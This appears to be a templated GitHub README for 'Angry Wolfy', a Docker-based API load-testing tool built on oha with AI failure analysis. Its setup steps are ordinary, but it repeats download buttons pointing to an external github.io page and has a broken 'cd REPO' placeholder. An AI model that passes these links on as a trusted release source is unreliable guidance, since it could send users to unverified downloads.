# Angry Wolfy - API Load Testing 2026

> **Angry Wolfy is a self-hosted API load testing solution for Docker. It relies on oha to produce sustained request traffic and provides AI-assisted analysis for investigating failed tests.**

[![Platform](https://img.shields.io/badge/Platform-Docker-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/caleb-walkeryjz5298/angry-wolfy-api-load-testing?style=flat-square)](https://github.com/caleb-walkeryjz5298/angry-wolfy-api-load-testing)

---

<p align="center">
  <a href="https://caleb-walkeryjz5298.github.io/angry-wolfy-api-load-testing/">
    <img src="https://img.shields.io/badge/Download-Angry%20Wolfy%20Latest-brightgreen?style=for-the-badge" alt="Download Angry Wolfy">
  </a>
</p>

> **[Download Angry Wolfy](https://caleb-walkeryjz5298.github.io/angry-wolfy-api-load-testing/)**

---

[Download Latest Build](https://caleb-walkeryjz5298.github.io/angry-wolfy-api-load-testing/)

---

## What Angry Wolfy Does

Angry Wolfy is built for examining API behavior while an endpoint handles ongoing traffic. It uses `oha` to issue requests and gather test data, helping developers assess how an API performs under sustained load.

The complete workflow runs in a Docker-based, self-hosted setup so testing can remain near the application environment. Alongside test reporting, the tool can apply AI-assisted analysis to failed runs and use application code context to help identify and explain likely failure causes.

---

## Capabilities

- Drive API requests through `oha`.
- Exercise APIs with sustained request volume.
- Examine test results for performance and runtime behavior.
- Analyze unsuccessful tests with AI assistance.
- Include relevant application source context during analysis.
- Investigate failures and produce possible explanations.
- Run the testing system in a self-hosted deployment.
- Manage installation and execution through Docker.

---

## Getting Started

First, clone the repository and switch into its directory:

```bash
git clone https://github.com/caleb-walkeryjz5298/angry-wolfy-api-load-testing.git
cd REPO
```

Create the Docker image:

```bash
docker build -t angry-wolfy .
```

Launch the container with the project's standard runtime configuration:

```bash
docker run --rm -it angry-wolfy
```

For deployments that include a Docker Compose file, start the configured services with:

```bash
docker compose up --build
```

Before running a test, inspect the available project settings. Pay particular attention to the API destination, traffic and load values, and options related to AI analysis.

---

## Running a Test

An ordinary test cycle looks like this:

1. Launch the Docker application.
2. Define the API URL and request information.
3. Choose the traffic volume and sustained-load settings.
4. Execute the test using the available application or command interface.
5. Review the results produced by `oha`.
6. Send failed cases through the AI-assisted analysis workflow.
7. Consider the findings alongside the provided application code context.
8. Update the API or load-test settings and repeat the test.

To discover command-line arguments and project-specific entry points, request help from the container or consult the included documentation:

```bash
docker run --rm angry-wolfy --help
```

---

## Configuration Options

Angry Wolfy can be configured through Docker runtime arguments, project files, or environment values supplied by the deployment.

Configuration commonly covers areas such as:

```text
API target:        URL and request route to test
Load parameters:   concurrency, duration, or request volume
Request settings:  method, headers, and payload
Analysis context:  application code supplied for investigation
AI settings:       provider or model configuration, when enabled
```

Do not commit credentials or other confidential values to version control. When available, use the repository's environment template or deployment-specific configuration for sensitive settings.

---

## Requirements

- Docker access with permission to build and start containers.
- An API endpoint that the test environment can reach.
- Network connectivity from the container to the target API.
- Enough CPU and memory for the selected traffic intensity.
- Application source context for code-aware failure investigation.
- Connectivity to the configured AI analysis service when that feature is enabled.

Storage needs vary according to the Docker images in use, the amount of retained test output, and the application context provided for analysis.

---

## Frequently Asked Questions

### What kind of users should use Angry Wolfy?

Angry Wolfy is intended for developers and teams conducting API tests, load tests, and performance investigations through a self-hosted setup.

### What sends the test traffic?

The tool uses `oha` to generate API requests and assess the target's behavior during sustained traffic.

### Can failed test runs be analyzed?

Yes. AI-assisted analysis can use both the test results and application code context to help investigate and explain failures.

### How should I keep configuration values?

Use the configuration files, environment settings, or deployment process supplied by the project. Credentials and private service values should not be committed to the repository.

### What is the update process?

Fetch the newest repository changes, rebuild the image, and restart the deployment:

```bash
git pull
docker build -t angry-wolfy .
```

### What can cause a connection failure?

Check that the target API is reachable from within the container. Also verify the route, request configuration, and Docker network permissions.

### How do I request help?

Project questions, reproducible problems, and improvement ideas can be submitted through the repository issue tracker:

[Open an issue](https://github.com/caleb-walkeryjz5298/angry-wolfy-api-load-testing/issues)

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
